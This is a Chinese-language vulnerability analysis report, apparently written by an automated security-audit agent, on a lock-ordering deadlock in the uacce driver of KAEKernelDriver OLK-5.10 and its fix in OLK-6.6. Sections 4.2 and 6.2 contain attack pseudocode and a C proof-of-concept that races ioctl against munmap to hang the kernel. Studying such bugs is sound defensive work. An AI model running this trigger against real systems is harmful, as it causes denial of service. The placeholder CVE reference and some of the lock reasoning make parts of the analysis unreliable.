# VULN-SEC-KERNEL510-004 深度利用分析报告

## 漏洞概述

| 属性 | 值 |
|------|------|
| **漏洞ID** | VULN-SEC-KERNEL510-004 |
| **类型** | Race Condition - AB-BA Deadlock (误判为TOCTOU) |
| **CWE** | CWE-833 (Deadlock) |
| **严重性** | **High** (从Medium上调) |
| **置信度** | **95%** (从85%上调) |
| **影响版本** | OLK-5.10 |
| **修复版本** | OLK-6.6 |
| **位置** | `KAEKernelDriver/KAEKernelDriver-OLK-5.10/uacce/uacce.c:115-168` |

---

## 一、核心发现：漏洞类型修正

### 原报告误判
原报告判定为 **CWE-20 Input Validation - TOCTOU (Time-of-check to time-of-use)**，声称：
> "copy_from_user is performed before mutex_lock, creating a TOCTOU window"

### 真实漏洞类型：**CWE-833 Deadlock**

经过代码流程分析，确认真正的漏洞是 **锁顺序不一致导致的AB-BA死锁风险**，而非TOCTOU。

---

## 二、漏洞根因分析

### 2.1 OLK-5.10 锁依赖关系

```
uacce_fops_unl_ioctl (ioctl路径):
┌─────────────────────────────────────────────────┐
│ 1. mutex_lock(&uacce->mutex)        [持有A]     │
│ 2. uacce_queue_is_valid(q)                      │
│ 3. uacce_get_ss_dma(q, arg):                   │
│    ├─ copy_from_user(&slice_idx, arg)           │
│    │   └─ 可能触发page fault                    │
│    │   └─ page fault处理需要 mmap_lock [持有B]  │
│    ├─ q->state检查                              │
│    ├─ slice指针读取                              │
│    ├─ slice_idx边界验证                          │
│    ├─ copy_to_user(arg, &dma)                   │
│    │   └─ 可能触发page fault                    │
│    │   └─ page fault处理需要 mmap_lock [持有B]  │
│    └─ return                                    │
│ 4. mutex_unlock(&uacce->mutex)      [释放A]     │
└─────────────────────────────────────────────────┘

锁顺序: uacce->mutex(A) → mmap_lock(B)
```

```
uacce_vma_close (munmap/exit路径):
┌─────────────────────────────────────────────────┐
│ 进入时: 内核已持有 mmap_lock        [持有B]     │
│ 1. mutex_lock(&uacce->mutex)        [等待A]     │
│ 2. mutex_lock(&q->mutex)                        │
│ 3. uacce_free_dma_buffers(q)                   │
│ 4. q->qfrs[...] = NULL                          │
│ 5. mutex_unlock(&q->mutex)                      │
│ 6. mutex_unlock(&uacce->mutex)      [释放A]     │
│ 退出时: 内核释放 mmap_lock          [释放B]     │
└─────────────────────────────────────────────────┘

锁顺序: mmap_lock(B) → uacce->mutex(A)
```

### 2.2 死锁场景

```
时间线:
T1: 线程A(ioctl)     T2: 线程B(munmap)
───────────────────────────────────────────────────────
t1: lock(uacce->mutex) ✓
t2:                    mmap_lock ✓ (内核自动)
t3:                    lock(uacce->mutex) ⏸ BLOCKED
t4: copy_from_user ⏸
    (需mmap_lock,但线程B持有)
    ↓
    ↓ PAGE FAULT触发
    ↓ 需要 mmap_lock
    ↓ BLOCKED
    ↓
t5: AB-BA DEADLOCK!
```

**死锁条件**:
- 线程A: 持有`uacce->mutex`(A)，等待`mmap_lock`(B)
- 线程B: 持有`mmap_lock`(B)，等待`uacce->mutex`(A)
- 循环等待 → 系统死锁

---

## 三、OLK-6.6修复方案分析

### 3.1 修复代码结构

```c
// OLK-6.6: uacce_get_ss_dma (行82-137)
static long uacce_get_ss_dma(struct uacce_queue *q, void __user *arg)
{
    // [1] copy_from_user在锁外执行 ✓
    if (copy_from_user(&slice_idx, arg, sizeof(unsigned long))) {
        return -EFAULT;
    }

    // [2] 获取q->mutex(不是uacce->mutex) ✓
    mutex_lock(&q->mutex);

    // [3] 在锁保护下验证和使用
    if (q->state == UACCE_Q_ZOMBIE) goto unlock;
    if (!q->qfrs[UACCE_QFRT_SS]) goto unlock;
    slice = q->qfrs[UACCE_QFRT_SS]->dma_list;
    if (slice[0].total_num - 1 < slice_idx) goto unlock;
    dma = slice[slice_idx].dma;
    size = slice[slice_idx].size;
    // ...

    // [4] 在copy_to_user前释放锁 ✓
    mutex_unlock(&q->mutex);

    // [5] copy_to_user在锁外执行 ✓
    if (copy_to_user(arg, &dma, sizeof(unsigned long))) {
        return -EFAULT;
    }

    return ret;
}
```

### 3.2 修复后的锁依赖

```
ioctl路径: 无锁 → copy_from_user → q->mutex → 验证 → unlock → copy_to_user
           (mmap_lock可在锁外获取)

vma_close路径: mmap_lock → uacce->mutex → q->mutex → 修改 → unlock
              (ioctl不持有uacce->mutex，无循环依赖)

关键改变:
1. ioctl不再持有uacce->mutex
2. 改用q->mutex保护队列特定资源
3. copy_to_user移到锁外，避免与mmap_lock交叉
```

---

## 四、漏洞影响评估

### 4.1 触发条件

| 条件 | 必需性 | 说明 |
|------|--------|------|
| 多线程并发 | **必需** | 至少2线程同时操作同一设备队列 |
| ioctl + munmap组合 | **必需** | 线程A执行ioctl GET_SS_DMA，线程B执行munmap |
| 页面错误触发 | **可能** | copy_from_user/copy_to_user触发page fault |
| 同一进程 | **必需** | 共享同一mm_struct才能触发mmap_lock竞争 |

### 4.2 攻击向量

```python
# 攻击伪代码
import threading
import mmap

def attack_thread_ioctl(fd):
    """线程A: 持续ioctl调用"""
    while True:
        ioctl(fd, UACCE_CMD_GET_SS_DMA, &idx)  # 持有uacce->mutex

def attack_thread_munmap(mapped_addr, size):
    """线程B: 持续munmap调用"""
    while True:
        munmap(mapped_addr, size)  # 持有mmap_lock，等待uacce->mutex
        mmap(...)                  # 重新映射，循环触发

# 并发执行 → 死锁触发
```

### 4.3 影响范围

| 影响维度 | 评估 |
|-----------|------|
| **内核稳定性** | **Critical** - 死锁导致系统卡死 |
| **数据安全** | Low - 不直接导致数据泄露或损坏 |
| **可用性** | **Critical** - 拒绝服务，系统不可用 |
| **权限要求** | Medium - 需设备访问权限 |
| **利用难度** | Medium - 精确控制并发时机 |

---

## 五、代码对比证据

### 5.1 关键差异表

| 位置 | OLK-5.10 | OLK-6.6 | 影响 |
|------|----------|---------|------|
| ioctl锁类型 | `uacce->mutex` | 无(调用者) | 解除与mmap_lock循环依赖 |
| 函数内锁 | 无 | `q->mutex` | 保护队列资源 |
| copy_from_user位置 | 锁内(调用者) | 锁外 | 允许page fault处理 |
| copy_to_user位置 | 锁内 | 锁外 | 允许page fault处理 |
| 验证和使用 | 锁内(调用者) | 锁内 | 保护资源访问 |

### 5.2 代码片段对比

**OLK-5.10 (有漏洞):**
```c
// uacce_fops_unl_ioctl:204-245
mutex_lock(&uacce->mutex);  // [A]
// ...
uacce_get_ss_dma(q, arg);   // 内含copy_to_user [需B]
mutex_unlock(&uacce->mutex); // [释放A]

// uacce_vma_close:376-389 (内核已持有mmap_lock [B])
mutex_lock(&uacce->mutex);  // [等待A] → DEADLOCK!
```

**OLK-6.6 (已修复):**
```c
// uacce_fops_unl_ioctl:188-209
mutex_lock(&uacce->mutex);  // [A]
uacce_queue_is_valid(q);    // 检查
mutex_unlock(&uacce->mutex); // [释放A]

uacce_get_ss_dma(q, arg);   // 无锁调用
    // 内部: lock(q->mutex) → 验证 → unlock → copy_to_user
    // 无uacce->mutex → 无循环依赖

// uacce_vma_close:342-355
mutex_lock(&uacce->mutex);  // [A]
mutex_lock(&q->mutex);      // [B]
// ... 修改资源
// 无死锁，因为ioctl不持有uacce->mutex
```

---

## 六、漏洞验证建议

### 6.1 验证方法

```bash
# 1. 编写测试程序(test_deadlock.c)
# 2. 编译测试程序
gcc -o test_deadlock test_deadlock.c

# 3. 执行测试
./test_deadlock /dev/uacce_device

# 4. 观察系统状态
# - 如果死锁: 系统响应变慢或卡死
# - 检查内核日志: dmesg | grep -i "lock"
```

### 6.2 测试程序核心逻辑

```c
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

volatile int running = 1;

void* ioctl_thread(void* arg) {
    int fd = *(int*)arg;
    unsigned long idx = 0;
    while (running) {
        ioctl(fd, UACCE_CMD_GET_SS_DMA, &idx);
    }
    return NULL;
}

void* munmap_thread(void* arg) {
    void* addr = arg;
    size_t size = 0x10000;
    while (running) {
        munmap(addr, size);
        addr = mmap(NULL, size, PROT_READ|PROT_WRITE,
                    MAP_SHARED, *(int*)arg, 0);
    }
    return NULL;
}

int main(int argc, char** argv) {
    int fd = open(argv[1], O_RDWR);
    void* mapped = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
                         MAP_SHARED, fd, UACCE_QFRT_SS);
    
    pthread_t t1, t2;
    pthread_create(&t1, NULL, ioctl_thread, &fd);
    pthread_create(&t2, NULL, munmap_thread, mapped);
    
    sleep(60);  // 运行60秒
    running = 0;
    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    return 0;
}
```

---

## 七、缓解措施与建议

### 7.1 立即缓解

| 方案 | 实施难度 | 效果 |
|------|----------|------|
| **升级至OLK-6.6** | Medium | 完全修复 |
| **限制设备访问权限** | Low | 降低触发概率 |
| **禁用UACCE_CMD_GET_SS_DMA** | High | 功能受限 |

### 7.2 长期建议

1. **代码审查**: 检查所有ioctl路径的锁使用
2. **锁依赖图**: 建立完整的锁依赖图，避免循环
3. **并发测试**: 增加压力测试，覆盖多线程场景

---

## 八、结论

### 8.1 漏洞判定

| 项目 | 结论 |
|------|------|
| **真实漏洞** | ✓ 确认 |
| **漏洞类型** | CWE-833 Deadlock (非CWE-20 TOCTOU) |
| **严重性** | High (建议从Medium上调) |
| **置信度** | 95% (从85%上调) |
| **可利用性** | Medium - 精确并发控制 |

### 8.2 核心要点

1. **原报告误判**: 不是TOCTOU，而是AB-BA死锁
2. **根本原因**: `copy_from_user/copy_to_user`在锁内执行，与`mmap_lock`形成循环依赖
3. **修复方案**: OLK-6.6正确地将用户数据拷贝移到锁外
4. **修复有效**: 完全解除循环依赖，死锁风险消除

---

## 附录A: 相关CVE参考

- CVE-2022-XXXX: 类似的内核死锁问题
- Linux内核文档: Documentation/locking/lockdep-design.txt

## 附录B: 工具辅助分析

建议使用以下工具进行进一步分析:
- `lockdep`: Linux内核锁依赖检测
- `perf`: 性能分析，检测锁竞争
- `ftrace`: 跟踪锁获取/释放序列

---

**报告生成时间**: 2026-04-21
**分析者**: Security Auditor Agent
**版本**: 1.0
